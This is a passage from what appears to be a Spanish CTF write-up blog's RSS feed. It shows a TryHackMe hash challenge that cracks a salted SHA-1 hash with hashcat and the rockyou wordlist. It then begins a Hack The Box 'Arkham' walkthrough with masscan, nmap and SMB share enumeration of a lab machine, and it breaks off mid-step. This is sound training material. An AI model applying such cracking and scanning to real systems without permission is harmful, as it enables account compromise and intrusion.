&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  SHA-1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;MaNGOS2&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  sha1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;.&lt;span class=&#34;nv&#34;&gt;$salt&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  sha1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$salt&lt;/span&gt;.&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  sha1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$salt&lt;/span&gt;.md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  sha1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$salt&lt;/span&gt;.md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.&lt;span class=&#34;nv&#34;&gt;$salt&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  sha1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$salt&lt;/span&gt;.sha1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  sha1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$salt&lt;/span&gt;.sha1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$salt&lt;/span&gt;.sha1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)))&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  sha1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$username&lt;/span&gt;.&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  sha1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$username&lt;/span&gt;.&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;.&lt;span class=&#34;nv&#34;&gt;$salt&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  sha1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  sha1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.&lt;span class=&#34;nv&#34;&gt;$salt&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  sha1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;sha1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)))&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  sha1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;sha1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  sha1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;sha1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.&lt;span class=&#34;nv&#34;&gt;$salt&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  sha1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;sha1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.substr&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;,0,3&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  sha1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;sha1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$salt&lt;/span&gt;.&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  sha1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;sha1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;sha1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)))&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  sha1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;strtolower&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$username&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;

   -------------------------------------------------------------------------
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h4 id=&#34;hashcat-8&#34;&gt;HASHCAT&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sckull@tars:~/tools/hashcat$ ./hashcat64.bin -m &lt;span class=&#34;m&#34;&gt;110&lt;/span&gt; ../hash.sha1 ../rockyou.txt 
hashcat &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;v5.1.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; starting...

* Device &lt;span class=&#34;c1&#34;&gt;#2: WARNING! Kernel exec timeout is not disabled.&lt;/span&gt;
             This may cause &lt;span class=&#34;s2&#34;&gt;&amp;#34;CL_OUT_OF_RESOURCES&amp;#34;&lt;/span&gt; or related errors.
             To disable the timeout, see: https://hashcat.net/q/timeoutpatch
nvmlDeviceGetFanSpeed&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;: Not Supported

OpenCL Platform &lt;span class=&#34;c1&#34;&gt;#1: Intel(R) Corporation&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;========================================&lt;/span&gt;
* Device &lt;span class=&#34;c1&#34;&gt;#1: Intel(R) Core(TM) i5-8250U CPU @ 1.60GHz, skipped.&lt;/span&gt;

OpenCL Platform &lt;span class=&#34;c1&#34;&gt;#2: NVIDIA Corporation&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;======================================&lt;/span&gt;
* Device &lt;span class=&#34;c1&#34;&gt;#2: GeForce MX130, 501/2004 MB allocatable, 3MCU&lt;/span&gt;

Hashes: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; digests&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; unique digests, &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; unique salts
Bitmaps: &lt;span class=&#34;m&#34;&gt;16&lt;/span&gt; bits, &lt;span class=&#34;m&#34;&gt;65536&lt;/span&gt; entries, 0x0000ffff mask, &lt;span class=&#34;m&#34;&gt;262144&lt;/span&gt; bytes, 5/13 rotates
Rules: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;

Applicable optimizers:
* Zero-Byte
* Early-Skip
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

Minimum password length supported by kernel: &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
Maximum password length supported by kernel: &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt;
Minimim salt length supported by kernel: &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
Maximum salt length supported by kernel: &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt;

ATTENTION! Pure &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;unoptimized&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; OpenCL kernels selected.
This enables cracking passwords and salts &amp;gt; length &lt;span class=&#34;m&#34;&gt;32&lt;/span&gt; but &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; the price of drastically reduced performance.
If you want to switch to optimized OpenCL kernels, append -O to your commandline.

Watchdog: Temperature abort trigger &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; to 90c

Dictionary cache hit:
* Filename..: ../rockyou.txt
* Passwords.: &lt;span class=&#34;m&#34;&gt;14344385&lt;/span&gt;
* Bytes.....: &lt;span class=&#34;m&#34;&gt;139921507&lt;/span&gt;
* Keyspace..: &lt;span class=&#34;m&#34;&gt;14344385&lt;/span&gt;

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;s&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;tatus &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;p&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;ause &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;b&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;ypass &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;c&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;heckpoint &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;q&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;uit&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Crackeada:&lt;/strong&gt;&lt;br /&gt;
&lt;code&gt;e5d8870e5bdd26602cab8dbe07a942c8669e56d6:481616481616&lt;/code&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/thm/hashes/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/thm/hashes/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>challenge</category>
            
          
        
        
          
            
              <category>tryhackme</category>
            
          
        
        
      </item>
      
      <item>
        <title>Hack The Box - Arkham</title>
        <link>https://sckull.github.io/posts/arkham/</link>
        <pubDate>Sat, 10 Aug 2019 00:00:00 +0000</pubDate>
        
        <atom:modified>Sat, 10 Aug 2019 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/arkham/</guid>
        <description>Arkham es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
        <content:encoded>&lt;p&gt;Arkham es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/htb/arkham/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Nombre&lt;/th&gt;
&lt;th&gt;Arkham&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;OS&lt;/td&gt;
&lt;td&gt;Windows&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;30&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Media&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;IP&lt;/td&gt;
&lt;td&gt;10.10.10.130&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/8308&#34;&gt;MinatoTW&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;masscan&#34;&gt;MASSCAN&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos tcp/udp.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@sckull:~/htb/arkham# masscan -p1-65535,U:1-65535 10.10.10.130 --rate&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1000&lt;/span&gt; -e tun0

Starting masscan 1.0.4 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;http://bit.ly/14GZzcT&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2019-03-25 19:10:12 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; hosts &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;131070&lt;/span&gt; ports/host&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
Discovered open port 49666/tcp on 10.10.10.130                                 
Discovered open port 139/tcp on 10.10.10.130                                   
Discovered open port 445/tcp on 10.10.10.130                                   
Discovered open port 135/tcp on 10.10.10.130                                   
Discovered open port 8080/tcp on 10.10.10.130                                  
Discovered open port 49667/tcp on 10.10.10.130
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de servicios en puertos anteriormente encontrados.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@sckull:~/htb/arkham# nmap -sV -p 135,139,445,8080,49666,49667 10.10.10.130
Starting Nmap 7.70 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2019-03-25 19:13 GMT
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.130
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.36s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.

PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
8080/tcp  open  http          Apache Tomcat 8.5.37
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; IP address &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; host up&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; scanned in 68.49 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;smb&#34;&gt;SMB&lt;/h2&gt;
&lt;p&gt;Buscamos los sharenames a los que tengamos acceso.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@sckull:~/htb/arkham# smbclient -L 10.10.10.130
Enter WORKGROUP&lt;span class=&#34;se&#34;&gt;\r&lt;/span&gt;oot&lt;span class=&#34;s1&#34;&gt;&amp;#39;s password: 
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;	Sharename       Type      Comment
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;	---------       ----      -------
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;	ADMIN$          Disk      Remote Admin
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;	BatShare        Disk      Master Wayne&amp;#39;&lt;/span&gt;s secrets
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	Users           Disk      
Reconnecting with SMB1 &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; workgroup listing.
Connection to 10.10.10.130 failed &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Error NT_STATUS_RESOURCE_NAME_NOT_FOUND&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Failed to connect with SMB1 -- no workgroup available
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;smb---batshare&#34;&gt;SMB - BatShare&lt;/h3&gt;
&lt;p&gt;Nos conectamos al sharename.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@sckull:~/htb/arkham# smbclient &lt;span class=&#34;se&#34;&gt;\\\\&lt;/span&gt;10.10.10.130&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;BatShare
